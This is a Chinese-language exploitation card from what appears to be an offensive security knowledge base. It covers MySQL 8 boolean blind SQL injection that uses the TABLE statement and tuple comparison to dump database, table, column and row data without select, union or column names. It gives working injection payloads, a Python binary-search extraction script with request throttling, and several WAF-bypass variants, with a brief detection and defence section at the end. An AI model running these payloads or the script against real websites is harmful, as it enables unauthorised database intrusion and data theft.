---
id: web-generic-sqli-mysql8-table-row-constructor-lexicographic-blind
title: MySQL 8 TABLE 语句 + 元组字典序比较的二分布尔盲注：不依赖 select/列名/报错，按 information_schema 实际列数补齐常量逐字符还原库表字段
type: scenario
domain: web
path: web/generic/sqli
technique: mysql8-table-row-constructor-lexicographic-boolean-blind
tags:
- web
- sqli
- mysql
- mysql8
- table-statement
- row-comparison
- boolean-blind
- binary-collation
- waf-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: MySQL 8.0（原文标注 MySQL 8.0.21 环境；TABLE 语句自 8.0.19 起提供）
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:48:30+08:00'
  notes: 已对照原文核对：TABLE 等价 SELECT *、不支持 WHERE、行构造器逐列字典序比较、schemata 6 列/tables 21 列/columns 22 列须补齐、lower_case_table_names 与 binary 修法、psych 为真值标记，均与原文一致；已把 PoC 中比较符统一为 > 并修正二分方向说明；未验证点：affected_versions 的 8.0.19 特性起点来自 MySQL 官方文档，原文只标注 8.0.21 环境，未逐版本实测
url: /docs/web/generic/sqli/web-generic-sqli-mysql8-table-row-constructor-lexicographic-blind/
draft: false
kb_aliases:
- TABLE 行比较盲注
- MySQL8 无列名盲注
- 元组比较二分盲注
- (a,b,c)<(table t limit n,1)
- binary 区分大小写盲注
- NewSQL Demo
---

## 一句话结论

当 `select`、`union` 被过滤或需要“不知道列名”地读取数据时，用 MySQL 8 的 `TABLE 表名 LIMIT n,1` 取出一整行，与攻击者构造的等长常量元组做字典序比较（`('def','库名','表名',…) < (TABLE information_schema.tables LIMIT n,1)`），把真/假响应当作 oracle，再用二分法逐字符收敛，就能在完全不出现 `select`、不引用任何列名、也不依赖报错回显的情况下把库名、表名、字段名与数据行完整还原；关键约束是**常量元组的列数必须与目标表实际列数一致**，且对真正存数据的列做比较时要加 `binary` 前缀，否则默认排序规则会把大小写判成相等。

## 原理

- **`TABLE t` 等价 `SELECT * FROM t`**：MySQL 8.0.19 起 `TABLE tbl [ORDER BY …] [LIMIT …]` 返回表中所有列、不支持 `WHERE`；由于返回的是“整行”，它天然可以作为行构造器（row constructor）的一个操作数，且完全不含 `select` 关键字。
- **元组比较是逐列字典序**：`(a1,a2,…) < (b1,b2,…)` 先比第一列，相等再比第二列，依此类推。把 `TABLE …` 的结果当作右侧元组，左侧填“当前猜测前缀 + 一个试探字符 + 若干占位常量”，一次比较就能回答“目标行在这一列上是否大于/小于猜测值”，等价于一个逐字符的序 oracle，比 `substr(...)='x'` 的等值猜测更适合二分。
- **为什么必须补齐列数**：行构造器两侧的列数必须相同，否则 MySQL 直接报 `Operand should contain N column(s)`。原文给出 `information_schema.schemata` 6 列、`tables` 21 列、`columns` 22 列，因此常量元组要按对应表的列数补齐（`('def','库名','表名','',5,6,7,…,21)` 这种写法），并在“固定前缀 + 待猜字符”之后用数字占位填满剩余列。
- **为什么能无列名提取**：`TABLE` 不要求写列名；行比较也不要求写列名。于是“要先爆列名才能爆数据”的传统思路被绕开，连 `information_schema` 的实际列序都只依赖官方固定结构（第一列固定为 `def`、第二列/第三列为库名/表名等）。
- **为什么需要 `binary`**：默认字符集排序规则（如 `utf8mb4_general_ci`）比较时大小写不敏感，`'A'` 与 `'a'` 判等；而 `information_schema` 里的库名/表名/列名本身在 Linux 上区分大小写（`lower_case_table_names=0`，Windows 默认 1、macOS 默认 2，只影响标识符查找，不解数据行的排序规则问题）。真正存业务数据的表行若不显式 `binary`，逐字符二分在大小写处会“判不出差距”而断链，原文的修法是给被比较列加 `binary'{猜测前缀}'`（或对表达式用 `BINARY`），强制二进制比较。
- **二分收敛**：每字符把区间 `[32,127)` 对半，按 oracle 收窄，`log2(95)≈7` 次请求定一个字符；原文用响应中出现固定标记（如 `psych` 字样）为真，二分 + 终止条件（连续空字符/越界）判断结束。
- **oracle 形式可替换**：本篇是布尔（响应差异），同一元组比较也能换成 `if(cond, exp(710), 1)` 的报错 oracle 或 `sleep()` 的时间 oracle。

## 触发条件

- 目标数据库为 MySQL 8.0.19+（`TABLE` 语句可用）。
- 存在可拼接的注入点，且真/假（或报错/正常、慢/快）响应可区分；注入位置允许子查询或行构造器表达式（`id=1 and (<tuple>) < (TABLE …)` 这种形式最常见）。
- `select`、`union` 等关键字被过滤，但 `table`、`information_schema`、`and`、`binary` 未被拦截。
- 知道目标表的列数（`information_schema` 系统表结构固定；业务表可用 `VALUES ROW(...)` 试探或从已知 schema 推断）。
- 请求频率可接受（每字符约 7 次请求）或可加延时绕过限速。

## 利用步骤

1. 确认注入与 oracle：提交 `1 and 1=1` / `1 and 1=2`，观察响应差异；原文靶场的真响应里带有固定标记词（如 `psych`），可作为判别依据。
2. 验证 `TABLE` 可用：`1 and ('def','a','','',5,6)<(table information_schema.schemata limit 0,1)--+`，观察真假变化。
3. 爆库名：对 `information_schema.schemata`（6 列）逐行 `limit n,1`，二分比较 `('def',{已猜测前缀+试探字符},'',4,5,6)`，收敛出第 n 个库名。
4. 爆表名：对 `information_schema.tables`（21 列，第三列为表名）用 `('def','{库}','{前缀+试探字符}','',5,…,21)` 二分。
5. 爆字段名：对 `information_schema.columns`（22 列，第四列为列名）用 `('def','{库}','{表}','{前缀+试探字符}','',6,…,22)` 二分。
6. 爆数据：用 `('{行号}',binary'{前缀+试探字符}') > (table {库}.{表} limit {n},1)` 之类的二元组比较逐行逐字符取值，`binary` 保证大小写敏感。
7. 加节流（每请求 `sleep 0.2~0.5s`）、失败重试与终止条件（连续两个空字符或字符越界），拼装完整结果。

## PoC

最小骨架（布尔二分，标记词按目标实际响应替换）：

```http
GET /?id=1 and ('def','c','','',5,6)>(table information_schema.schemata limit 0,1)--+ HTTP/1.1
Host: target
```

```python
import requests, time

URL = "http://TARGET/"
TRUE_MARK = "psych"          # 真响应中的固定标记

def oracle(payload: str) -> bool:
    r = requests.get(URL + "?id=" + payload, timeout=10)
    return TRUE_MARK in r.text

def extract_db(n: int) -> str:
    db = ""
    while True:
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            guess = db + chr(mid)
            payload = (f"1 and ('def','{guess}','','',5,6)"
                       f">(table information_schema.schemata limit {n},1)--+")
            if oracle(payload):
                hi = mid          # 猜测元组 > 目标行，说明猜测值偏大，收窄上界
            else:
                lo = mid + 1
            time.sleep(0.3)
        ch = chr(lo - 1)
        if lo == 32:              # 区间塌缩到起点，说明该行已读完
            break
        db += ch
    return db

print(extract_db(0))
```

说明：真实脚本要对 `tables`（21 列）与 `columns`（22 列）按列数补齐常量；原文在靶场上用该脚本依次爆出库、表、字段与数据行。比较符用 `>`（与原文脚本一致）：真响应表示“猜测元组大于目标行”，故收窄上界 `hi=mid`，否则 `lo=mid+1`，收敛后目标字符为 `chr(lo-1)`。本卡未复跑。

## 变体与关联

- **oracle 变体**：`if((<tuple>)>(<TABLE …>), exp(710), 1)` 报错盲注（见 [[web-generic-sqli-mysql8-table-keyword-exp-error-bypass]]）、`sleep(2)` 时间盲注、`extractvalue`/`updatexml` 报错。
- **列数探测变体**：业务表列数未知时，先用 `union values row(1,2,3…)` 逐个加常量试探列数（见 [[web-generic-sqli-mysql8-values-row-column-count-union]]）。
- **大小写变体**：`binary'{…}'`、`BINARY (…)`、`COLLATE utf8mb4_bin`，或改用 `ORD()`/`ASCII()` 比较码点（见 [[web-generic-sqli-blind-ascii-case-restore-login]]）。
- **替代写法**：`TABLE` 也可写成 `/*!50000table*/`、`TABLE`+`LIMIT` 换 `LIMIT n OFFSET m`；被过滤时可用 `(select * from t limit n,1)` 的行子查询做同样比较。
- 关联：[[web-generic-sqli-mysql8-table-keyword-exp-error-bypass]]（同一 `TABLE`+行比较原语但走报错 oracle）、[[web-generic-sqli-order-by-union-lexicographic-blind]]（字典序盲注的另一形态）、[[web-generic-sqli-blind-filter-bypass-functions]]（`if`/`sleep`/`and` 被过滤时的替代原语）。
- 边界：MySQL < 8.0.19 无 `TABLE`；注入点不允许子查询时行构造器不可用；列数猜错会直接报 `Operand should contain N column(s)`；数据表若不是 `binary`，大小写差异会被排序规则抹平导致结果错误。

## 检测与防御

- 检测：SQL 日志/审计中出现 `TABLE information_schema`、`TABLE <业务表>` 与元组比较（`('def',…)<(table …)`）组合；同一参数在短时间内产生大量仅差一个字符的请求且响应长度呈两簇分布（二分盲注特征）。
- 检测：WAF 命中 `select` 缺失但出现 `table`、`information_schema`、`limit n,1`、`binary'` 等组合。
- 防御：参数化查询/预编译，禁止拼接；WAF 规则覆盖 `TABLE`、`VALUES ROW`、行构造器比较与 `binary`；关闭详细 SQL 错误回显；对高频相似请求做限速与行为检测。
- 加固：数据库账号最小权限，限制 `information_schema` 访问；业务表字段使用合适的 `COLLATE` 并在应用层做大小写规范化，避免排序规则带来的语义歧义。
